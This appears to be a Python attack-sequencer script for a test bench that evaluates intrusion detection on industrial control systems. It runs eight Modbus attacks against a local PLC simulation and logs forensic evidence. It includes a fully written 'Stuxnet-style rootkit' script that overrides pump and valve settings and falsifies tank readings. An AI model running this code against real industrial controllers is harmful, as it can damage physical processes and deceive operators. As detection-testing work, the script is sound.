#!/usr/bin/env python3
"""
CPS-IDS Forensic Investigation — Automated Attack Sequencer

Waits for the plant dashboard + simulation, then runs all 7 attacks
sequentially against the simulation on localhost:5502. Logs timestamps
to an evidence manifest for later correlation with IDS alerts and PCAPs.
"""

import argparse
import json
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path
from urllib.request import urlopen, Request
from urllib.error import URLError

ATTACKS = [
    {
        "name": "command_injection",
        "label": "Command Injection",
        "method": "command_injection",
        "duration": 45,
        "description": "Forces pump ON/OFF every 5s via Write Coil (FC 0x05)",
    },
    {
        "name": "pump_oscillation",
        "label": "Pump Oscillation",
        "method": "pump_oscillation",
        "duration": 45,
        "description": "Rapid pump toggle every 2s (Stuxnet-style)",
    },
    {
        "name": "valve_manipulation",
        "label": "Valve Manipulation",
        "method": "valve_attack",
        "duration": 45,
        "description": "Random valve positions (0-180) every 3s via Write Register (FC 0x06)",
    },
    {
        "name": "replay_attack",
        "label": "Replay Attack",
        "method": "replay_attack",
        "duration": 45,
        "description": "Replays fixed 4-command ON/OFF sequence every 1s",
    },
    {
        "name": "sensor_spoofing",
        "label": "Sensor Spoofing",
        "method": "sensor_spoof",
        "duration": 45,
        "description": "Writes fake tank levels (0-100) every 2s via Write Register (FC 0x06)",
    },
    {
        "name": "modbus_flood",
        "label": "Modbus Flood (DoS)",
        "method": "modbus_flood",
        "duration": 20,
        "description": "100x Read Holding Registers (FC 0x03) in tight loop",
    },
    {
        "name": "multi_stage",
        "label": "Multi-Stage Attack",
        "method": "multi_stage_attack",
        "duration": 50,
        "description": "3-phase: recon (10s) -> manipulation (20s) -> flood (~10s)",
    },
    {
        "name": "stuxnet_rootkit",
        "label": "Stuxnet-Style Rootkit (MitM)",
        "method": "__rootkit__",  # special: runs rootkit-proxy.py as subprocess
        "duration": 60,
        "description": "MitM proxy: intermittent attack cycles (20s interval, 8s active) — "
                       "actuator manipulation + sensor falsification",
    },
]

PLC_HOST = "127.0.0.1"
PLC_PORT = 5502
DASHBOARD_URL = "http://localhost:8888"
GAP_SECONDS = 15


def ts():
    return datetime.now().isoformat(timespec="seconds")


def api_get(path):
    try:
        with urlopen(Request(f"{DASHBOARD_URL}{path}"), timeout=3) as r:
            return json.loads(r.read())
    except (URLError, Exception):
        return None


def api_post(path, timeout=15):
    try:
        req = Request(f"{DASHBOARD_URL}{path}", data=b"", method="POST")
        req.add_header("Content-Type", "application/json")
        with urlopen(req, timeout=timeout) as r:
            return json.loads(r.read())
    except (URLError, Exception) as e:
        return None


def wait_for_dashboard(timeout=60):
    print(f"[*] Waiting for dashboard at {DASHBOARD_URL} ...")
    t0 = time.time()
    while time.time() - t0 < timeout:
        if api_get("/api/simulation/status") is not None:
            print("[+] Dashboard is up")
            return True
        time.sleep(1)
    print("[!] Dashboard did not respond within timeout")
    return False


def start_simulation():
    """Start simulation with retries (subprocess startup takes ~6s)."""
    for attempt in range(3):
        print(f"[*] Starting plant simulation via dashboard API (attempt {attempt + 1}/3) ...")
        result = api_post("/api/simulation/start", timeout=20)
        if result and result.get("status") in ("started", "already_running"):
            print(f"[+] Simulation running (PLC1 on port {PLC_PORT})")
            # Give subprocesses time to bind ports
            time.sleep(3)
            return True
        print(f"[!] Attempt {attempt + 1} failed: {result}")
        time.sleep(2)
    print("[!] Failed to start simulation after 3 attempts")
    return False


def countdown(label, seconds):
    for i in range(seconds, 0, -1):
        print(f"\r    {label} {i}s ...  ", end="", flush=True)
        time.sleep(1)
    print()


def collect_system_artifacts(evidence_dir, label):
    """Capture system-level forensic artifacts: process list, network connections, PLC registers."""
    artifacts_dir = evidence_dir / "artifacts"
    artifacts_dir.mkdir(exist_ok=True)
    safe_label = label.lower().replace(" ", "_").replace("(", "").replace(")", "")
    timestamp = datetime.now().strftime("%H%M%S")
    prefix = f"{timestamp}_{safe_label}"

    # Process list
    try:
        result = subprocess.run(
            ["ps", "aux"], capture_output=True, text=True, timeout=5
        )
        (artifacts_dir / f"{prefix}_processes.txt").write_text(result.stdout)
    except Exception as e:
        print(f"    [!] Failed to capture process list: {e}")

    # Network connections
    try:
        result = subprocess.run(
            ["ss", "-tunap"], capture_output=True, text=True, timeout=5
        )
        (artifacts_dir / f"{prefix}_connections.txt").write_text(result.stdout)
    except Exception as e:
        print(f"    [!] Failed to capture connections: {e}")

    # PLC register snapshot via Modbus read
    try:
        from pymodbus.client import ModbusTcpClient
        client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)
        client.connect()
        regs = client.read_holding_registers(0, count=6)
        coils = client.read_coils(0, count=1)
        client.close()
        snapshot = {
            "timestamp": ts(),
            "label": label,
            "registers": {
                "tank_level": regs.registers[0] if regs and not regs.isError() else None,
                "valve_pos": regs.registers[1] if regs and not regs.isError() else None,
                "temperature": regs.registers[2] if regs and not regs.isError() else None,
                "sound": regs.registers[3] if regs and not regs.isError() else None,
                "ultrasonic": regs.registers[4] if regs and not regs.isError() else None,
                "alarm": regs.registers[5] if regs and not regs.isError() else None,
            },
            "coils": {
                "pump_state": coils.bits[0] if coils and not coils.isError() else None,
            },
        }
        with open(artifacts_dir / f"{prefix}_plc_registers.json", "w") as f:
            json.dump(snapshot, f, indent=2)
    except Exception as e:
        print(f"    [!] Failed to capture PLC registers: {e}")


def run_rootkit(rootkit_path, duration):
    """Run the Stuxnet-style rootkit proxy as a subprocess for a fixed duration."""
    # Patch the rootkit to target localhost simulation instead of 192.168.1.20:502
    script = f"""
import asyncio, random, time, sys
sys.path.insert(0, {str(rootkit_path.parent)!r})
from pymodbus.client import ModbusTcpClient

PLC_IP = {PLC_HOST!r}
PLC_PORT = {PLC_PORT}
ATTACK_INTERVAL = 20
ATTACK_DURATION = 8

class RootkitController:
    def __init__(self):
        self.client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
        self.attack_active = False
        self.last_attack = time.time()
        self.fake_level = 50

    def connect(self):
        print("[+] Rootkit connecting to PLC at %s:%d" % (PLC_IP, PLC_PORT))
        self.client.connect()

    def check_attack_cycle(self):
        now = time.time()
        if not self.attack_active and now - self.last_attack > ATTACK_INTERVAL:
            print("[ROOTKIT] Activating attack cycle")
            self.attack_active = True
            self.attack_start = now
        if self.attack_active and now - self.attack_start > ATTACK_DURATION:
            print("[ROOTKIT] Attack cycle ended — returning to stealth")
            self.attack_active = False
            self.last_attack = now

    def manipulate_actuators(self):
        if not self.attack_active:
            return
        state = random.choice([True, False])
        print("[ROOTKIT] Pump override:", state)
        self.client.write_coil(0, state)
        valve = random.randint(20, 160)
        print("[ROOTKIT] Valve override:", valve)
        self.client.write_register(1, valve)

    def falsify_sensor(self, real_value):
        if not self.attack_active:
            return real_value
        print("[ROOTKIT] Falsifying tank level: real=%d fake=%d" % (real_value, self.fake_level))
        return self.fake_level

rootkit = RootkitController()
rootkit.connect()

async def rootkit_loop():
    while True:
        rootkit.check_attack_cycle()
        if rootkit.attack_active:
            rootkit.manipulate_actuators()
        await asyncio.sleep(2)

async def telemetry_monitor():
    while True:
        rr = rootkit.client.read_holding_registers(0, count=2)
        if rr and not rr.isError():
            level = rr.registers[0]
            fake_level = rootkit.falsify_sensor(level)
            print("REAL LEVEL: %d | FAKE LEVEL: %d" % (level, fake_level))
        await asyncio.sleep(3)

async def main():
    await asyncio.gather(rootkit_loop(), telemetry_monitor())

asyncio.run(main())
"""

    proc = subprocess.Popen(
        [sys.executable, "-u", "-c", script],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )

    t0 = time.time()
    last_print = 0
    while time.time() - t0 < duration:
        if proc.poll() is not None:
            break
        elapsed = int(time.time() - t0)
        if elapsed > 0 and elapsed % 10 == 0 and elapsed != last_print:
            last_print = elapsed
            print(f"    [{elapsed}s/{duration}s] running ...")
        time.sleep(0.5)

    if proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()


def run_attack(attack, framework_path):
    """Spawn attack as subprocess, stream output, kill after duration."""
    # Special case: rootkit runs its own async script
    if attack["method"] == "__rootkit__":
        rootkit_path = framework_path.parent / "stux" / "rootkit-proxy.py"
        run_rootkit(rootkit_path, attack["duration"])
        return

    script = (
        f"import sys; sys.path.insert(0, {str(framework_path.parent)!r});\n"
        f"from importlib import import_module;\n"
        f"af = import_module('attack-framework');\n"
        f"fw = af.ICSAttackFramework.__new__(af.ICSAttackFramework);\n"
        f"from pymodbus.client import ModbusTcpClient;\n"
        f"fw.client = ModbusTcpClient({PLC_HOST!r}, port={PLC_PORT});\n"
        f"fw.client.connect();\n"
        f"fw.{attack['method']}()\n"
    )

    proc = subprocess.Popen(
        [sys.executable, "-u", "-c", script],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )

    t0 = time.time()
    duration = attack["duration"]
    last_print = 0
    lines_seen = 0

    while time.time() - t0 < duration:
        if proc.poll() is not None:
            break
        elapsed = int(time.time() - t0)
        # Print progress every 10s
        if elapsed > 0 and elapsed % 10 == 0 and elapsed != last_print:
            last_print = elapsed
            print(f"    [{elapsed}s/{duration}s] running ...")
        time.sleep(0.5)

    # Kill if still running
    if proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--evidence-dir", required=True)
    parser.add_argument("--repo-dir", required=True)
    parser.add_argument("--baseline", type=int, default=20,
                        help="Seconds of baseline capture before attacks")
    parser.add_argument("--gap", type=int, default=GAP_SECONDS,
                        help="Seconds between attacks (flow expiration)")
    args = parser.parse_args()

    evidence = Path(args.evidence_dir)
    repo = Path(args.repo_dir)
    framework = repo / "plant" / "attack-framework.py"
    manifest_path = evidence / "logs" / "attack-manifest.json"

    print()
    print("=" * 60)
    print("  CPS-IDS Forensic Investigation — Attack Runner")
    print("=" * 60)
    print()

    # 1) Wait for dashboard
    if not wait_for_dashboard():
        sys.exit(1)

    # 2) Start simulation
    if not start_simulation():
        sys.exit(1)

    # 3) Baseline — capture initial system state
    print(f"\n[*] Baseline period ({args.baseline}s) — normal traffic only")
    print("    Monitor + tcpdump should be capturing in other panes")
    print("    Capturing baseline system artifacts ...")
    collect_system_artifacts(evidence, "baseline_pre_attack")
    countdown("Attacks begin in", args.baseline)

    # 4) Attack loop
    manifest = {
        "investigation_start": ts(),
        "baseline_seconds": args.baseline,
        "gap_seconds": args.gap,
        "attacks": [],
    }

    for idx, attack in enumerate(ATTACKS, 1):
        print()
        print("=" * 60)
        print(f"  [{idx}/{len(ATTACKS)}] {attack['label']}")
        print(f"  {attack['description']}")
        print(f"  Duration: {attack['duration']}s")
        print("=" * 60)

        # Capture system state before attack
        print("    Capturing pre-attack artifacts ...")
        collect_system_artifacts(evidence, f"pre_{attack['name']}")

        start_time = ts()
        t0 = time.time()
        print(f"  [{start_time}] STARTED")

        run_attack(attack, framework)

        end_time = ts()
        elapsed = time.time() - t0
        print(f"  [{end_time}] STOPPED ({elapsed:.0f}s)")

        # Capture system state after attack
        print("    Capturing post-attack artifacts ...")
        collect_system_artifacts(evidence, f"post_{attack['name']}")

        manifest["attacks"].append({
            "name": attack["name"],
            "label": attack["label"],
            "description": attack["description"],
            "start_time": start_time,
            "end_time": end_time,
            "duration_seconds": round(elapsed, 1),
        })

        # Save incrementally
        with open(manifest_path, "w") as f:
            json.dump(manifest, f, indent=2)

        if idx < len(ATTACKS):
            print(f"\n[*] Gap before next attack ({args.gap}s for flow expiration)")
            countdown("Next attack in", args.gap)

    # 5) Done
    manifest["investigation_end"] = ts()
    manifest["total_attacks"] = len(ATTACKS)
    with open(manifest_path, "w") as f:
        json.dump(manifest, f, indent=2)

    total_min = sum(a["duration"] for a in ATTACKS) / 60
    print()
    print("=" * 60)
    print("  ALL ATTACKS COMPLETE")
    print("=" * 60)
    print()
    print(f"  Manifest: {manifest_path}")
    # Final system artifacts
    print("\n[*] Capturing final system artifacts ...")
    collect_system_artifacts(evidence, "post_investigation_final")

    # Post-attack wait for flow expiry
    print("\n[*] Waiting 20s for final flows to expire and get ML-classified...")
    countdown("Shutting down in", 20)

    print()
    print("  Next steps:")
    print("  1. Ctrl+C the IDS Monitor pane (triggers graceful shutdown + final ML)")
    print("  2. Ctrl+C the tcpdump pane")
    print("  3. Ctrl+C the dashboard pane")
    print("  ** Do NOT use 'tmux kill-session' — Ctrl+C allows graceful shutdown **")
    print()
    print("  Then analyse evidence:")
    print(f"    wireshark {evidence}/pcaps/full-session.pcap")
    print(f"    cat {evidence}/logs/alerts.jsonl | python3 -m json.tool")
    print(f"    cat {manifest_path} | python3 -m json.tool")
    print()


if __name__ == "__main__":
    main()
